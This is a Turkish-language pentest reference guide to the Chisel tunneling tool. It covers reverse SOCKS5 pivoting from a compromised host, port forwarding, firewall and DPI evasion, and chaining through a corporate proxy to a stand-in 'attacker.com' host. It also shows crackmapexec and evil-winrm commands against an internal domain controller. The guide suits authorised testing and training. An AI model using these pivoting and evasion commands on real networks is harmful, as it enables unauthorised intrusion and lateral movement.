# 🚇 Chisel - Kapsamlı Başvuru Kılavuzu

[🇺🇸 English Version](../README.md)

```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```

<p align="center">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</p>

<p align="center">
  <b>⚡ SSH ile şifrelenen ve HTTP/WebSocket üzerinden taşınan, tek bir taşınabilir ikiliye sahip hızlı TCP/UDP tünelleme aracı</b>
</p>

---

## 📋 İçindekiler

- [Giriş](#-giriş)
- [Çalışma Mantığı](#-çalışma-mantığı)
- [Kurulum](#-kurulum)
- [Mimari ve Tünel Modları](#-mimari-ve-tünel-modları)
- [Standart Pentest Yapılandırması: Reverse SOCKS5 Proxy](#-standart-pentest-yapılandırması-reverse-socks5-proxy)
  - [Adım 1: Saldırgan Sistemde Sunucuyu Başlatma](#adım-1-saldırgan-sistemde-sunucuyu-başlatma)
  - [Adım 2: Hedef Sistemden İstemciyi Bağlama](#adım-2-hedef-sistemden-i̇stemciyi-bağlama)
  - [Adım 3: Proxychains Yapılandırması](#adım-3-proxychains-yapılandırması)
  - [Adım 4: Araçları Tünel Üzerinden Çalıştırma](#adım-4-araçları-tünel-üzerinden-çalıştırma)
- [Yerel Port Yönlendirme (Local Port Forwarding)](#-yerel-port-yönlendirme-local-port-forwarding)
- [Uzak Port Yönlendirme (Gelen Trafiği Yakalama)](#-uzak-port-yönlendirme-gelen-trafiği-yakalama)
- [Kimlik Doğrulama ve Parmak İzi Doğrulama (Fingerprint Pinning)](#-kimlik-doğrulama-ve-parmak-i̇zi-doğrulama)
- [Güvenlik Duvarı Atlatma ve Kurumsal Proxy Zincirleme](#-güvenlik-duvarı-atlatma-ve-kurumsal-proxy-zincirleme)
- [Chisel vs Ligolo-ng vs SSH Karşılaştırması](#-chisel-vs-ligolo-ng-vs-ssh-karşılaştırması)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [İpuçları ve En İyi Pratikler](#-i̇puçları-ve-en-i̇yi-pratikler)
- [Yasal Uyarı](#-yasal-uyarı)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş

**Chisel**, Go diliyle yazılmış, güvenli SSH oturumlarını standart HTTP/WebSocket bağlantıları içerisine kapsülleyen (encapsulate eden) açık kaynaklı ve platformlar arası bir tünelleme aracıdır.

Oluşturduğu ağ trafiği kablo üzerinde standart HTTP/HTTPS veya WebSocket trafiği gibi göründüğünden; Chisel, doğrudan SSH veya VPN protokollerini engelleyen sıkı kurumsal güvenlik duvarlarını (firewall), Derin Paket İnceleme (DPI) sistemlerini ve web vekil sunucularını kolaylıkla atlatabilir.

### Temel Güçlü Yönleri

- 🚀 **Tek İkili (Single Binary):** Hem sunucu hem de istemci tek bir bağımsız ikili dosya içinde yer alır.
- 🛡️ **Güvenlik Duvarı Atlatma (Evasion):** Standart web trafiğine karışmak için 80/443 portları ve WebSocket protokolü üzerinden tüneller.
- 🔒 **Varsayılan Olarak Şifreli:** Arka planda SSH kriptografisi (ECDSA anahtarları ve AES-GCM) kullanır.
- 🔄 **SOCKS5 ve Port Yönlendirme:** Zahmetsizce ters SOCKS5 proxy veya tekil port yönlendirmeleri kurabilir.

---

## 🏗️ Çalışma Mantığı

```
+------------------------------------+                         +-----------------------------------+
|         Saldırgan Makine           |                         |        Ele Geçirilen Hedef        |
|         (192.168.1.100)            |                         |         (Çift Ağ Kartlı)          |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Yerel Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |            İç Ağ Kartı            |
|      [proxychains nmap]            |                         |          (172.16.1.0/24)          |
+------------------------------------+                         +-----------------------------------+
```

---

## 📥 Kurulum

### Kali Linux

```bash
sudo apt update && sudo apt install -y chisel
```

### Go ile Kurulum

```bash
go install github.com/jpillora/chisel@latest
```

### Derlenmiş İkili Dosyaları İndirme

Linux, Windows ve macOS için bağımsız ikilileri resmi GitHub sürümlerinden edinin:

```bash
# Saldırgan Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Hedef 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```

---

## 🔄 Standart Pentest Yapılandırması: Reverse SOCKS5 Proxy

Sızma testlerinde ve CTF ortamlarında hedef makine genellikle NAT veya güvenlik duvarı arkasında yer alır ve doğrudan dışarıdan içeriye bağlantı kabul edemez. Bu durumda bir **ters (reverse) SOCKS5 vekili** kurulur.

### Adım 1: Saldırgan Sistemde Sunucuyu Başlatma

Saldırgan makinenizde Chisel sunucusunu `8000` portunda (veya tespit edilmemek için `443`'te) ters yönlendirme izniyle başlatın:

```bash
chisel server --reverse -p 8000 -v
```

### Adım 2: Hedef Sistemden İstemciyi Bağlama

Ele geçirilen makinede istemciyi çalıştırarak saldırgan makinenize doğru ters SOCKS5 tüneli açın:

#### Linux Hedefte:
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```

#### Windows Hedefte:
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```

> **Sonuç:** Saldırgan makinenizdeki Chisel sunucusu, yerel `1080` portunda hedef üzerinden iç ağa yönlenen bir SOCKS5 proxy'si açar!

### Adım 3: Proxychains Yapılandırması

Saldırgan sistemde `/etc/proxychains4.conf` (veya `/etc/proxychains.conf`) dosyasını düzenleyin:

```ini
[ProxyList]
# protokol  sunucu      port
socks5      127.0.0.1   1080
```

### Adım 4: Araçları Tünel Üzerinden Çalıştırma

İç ağdaki hedeflere erişmek için komutlarınızın başına `proxychains` ekleyin:

```bash
# Nmap TCP Connect taraması
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB kimlik doğrulama testi
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# İç etki alanı denetleyicisine (DC) Evil-WinRM kabuğu açma
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```

---

## 🔀 Yerel Port Yönlendirme (Local Port Forwarding)

Tam bir SOCKS proxy yerine yalnızca iç ağdaki belirli bir portu (örneğin bir web paneli veya veritabanı) kendi saldırgan makinenize yönlendirebilirsiniz.

### Örnek: İç Web Servisine Erişme (Port 80)

Saldırgan sunucu (`192.168.1.100:8000`):
```bash
chisel server --reverse -p 8000
```

Hedef istemci:
```bash
# Hedefin iç ağındaki localhost:80'i saldırganın localhost:8080 portuna taşır
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```

Artık saldırgan makinenizdeki tarayıcıdan `http://127.0.0.1:8080` adresine giderek iç web servisini görüntüleyebilirsiniz!

### Örnek: İç Veritabanını Dışarıya Açma (MySQL 3306)

Hedef istemci:
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```

Saldırgan terminalinizden doğrudan bağlanın:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```

---

## 🌐 Uzak Port Yönlendirme (Gelen Trafiği Yakalama)

Hedef makinede bir port açarak gelen bağlantıları saldırgan sisteminizdeki bir servise yönlendirebilirsiniz:

```bash
# Hedefte 9000 portunu açar, gelen trafiği saldırganın 9000 portuna iletir
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```

---

## 🔐 Kimlik Doğrulama ve Parmak İzi Doğrulama

Canlı sızma testlerinde açık bırakılan Chisel portlarının başkaları tarafından kullanılmasını önlemek için kimlik doğrulama ekleyin:

### Kimlik Doğrulama (`--auth`)

```bash
# Sunucu kimlik doğrulaması ister
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# İstemci bu bilgilerle bağlanır
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```

### Parmak İzi Sabitleme (Fingerprint Pinning)

Sunucu başladığında SSH açık anahtar parmak izini ekrana basar:
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```

Ortadaki adam (MITM) saldırılarını engellemek için istemcide bu parmak izini sabitleyin:
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```

---

## 🛡️ Güvenlik Duvarı Atlatma ve Kurumsal Proxy Zincirleme

İç hedef yalnızca kurumsal bir HTTP vekil sunucusu üzerinden internete çıkabiliyorsa:

```bash
# Kurumsal vekil üzerinden Chisel trafiğini tünelleme
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```

---

## ⚖️ Chisel vs Ligolo-ng vs SSH Karşılaştırması

| Özellik | Chisel | Ligolo-ng | SSH Tünelleme |
|---------|--------|-----------|---------------|
| **Birincil Yöntem** | SOCKS5 ve Port Yönlendirme | TUN Arayüzü (VPN) | SOCKS5 ve Port Yönlendirme |
| **Taşıma Protokolü** | HTTP / WebSocket | Ham TLS | SSH (Port 22) |
| **Güvenlik Duvarı Atlatma**| ⭐⭐⭐⭐⭐ Mükemmel | ⭐⭐⭐⭐ Çok İyi | ⭐⭐ Zayıf (Port 22 genelde kapalıdır) |
| **Root/Yönetici İzni** | ❌ Gerekmez (Userland) | ✅ Gerekir (TUN oluşturmak için) | ❌ Gerekmez |
| **Nmap SYN Taraması (`-sS`)**| ❌ Hayır | ✅ Evet | ❌ Hayır |
| **UDP Desteği** | Kısmi (SOCKS5 üzerinden) | ✅ Tam doğal UDP | ❌ Çok kısıtlı |

---

## 📊 Hızlı Referans Tablosu

| Mod | Komut | Amaç |
|-----|-------|------|
| **Sunucu (Reverse İzniyle)** | `chisel server --reverse -p 8000` | 8000 portunda ters yönlendirmeye açık sunucu başlatır |
| **İstemci (Ters SOCKS5)** | `chisel client <IP>:8000 R:1080:socks` | Saldırganın 1080 portunda ters SOCKS5 açar |
| **İstemci (Port Yönlendirme)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Hedefin 80 portunu saldırganın 8080 portuna haritalar |
| **İstemci (Saldırgan Portunu Açma)**| `chisel client <IP>:8000 4444:127.0.0.1:4444` | Hedefte 4444 portu açıp saldırgana iletir |
| **Kimlik Doğrulamalı Sunucu** | `chisel server --reverse --auth "u:p" -p 8000`| İstemcilerden parola talep eder |
| **Kimlik Doğrulamalı İstemci**| `chisel client --auth "u:p" <IP>:8000 R:socks`| Parolayla bağlantı kurar |
| **Bağlantı Koruma (Keep-Alive)**| `chisel client --keepalive 10s <IP>:8000 R:socks`| Güvenlik duvarının boşta kalan oturumu kapatmasını engeller |

---

## 💡 İpuçları ve En İyi Pratikler

1. **En Yüksek Atlatma İçin 443 Portunu Kullanın:**
   Güvenlik duvarları 8000 veya 8080 portlarını inceleyebilir. Chisel sunucunuzu `443` portunda çalıştırırsanız trafik standart HTTPS WebSocket trafiğinden ayırt edilemez.
2. **Proxychains Zaman Aşımı Değerlerini Ayarlayın:**
   Proxychains üzerinden yapılan bağlantılar yavaş kalıyorsa `/etc/proxychains4.conf` dosyasında şu değerleri güncelleyin:
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **Hedefte Yönetici (Root/Admin) Yetkisi Gerekmez:**
   TUN aygıtı gerektiren VPN çözümlerinin aksine Chisel tamamen kullanıcı alanında (user-space) çalışır. `www-data`, `nobody` veya standart bir kısıtlı kullanıcı hesabı ile rahatlıkla çalıştırılabilir.

---

## ⚠️ Yasal Uyarı

> **ÖNEMLİ:** Chisel yalnızca izinli güvenlik testlerinde, Red Team simülasyonlarında ve meşru sistem yönetiminde kullanılmalıdır. Yetkisiz ağlarda tünel açmak yasalara aykırıdır.

---

## 📚 Kaynaklar

- [Chisel GitHub Deposu](https://github.com/jpillora/chisel)
- [Proxychains-NG Projesi](https://github.com/rofl0r/proxychains-ng)
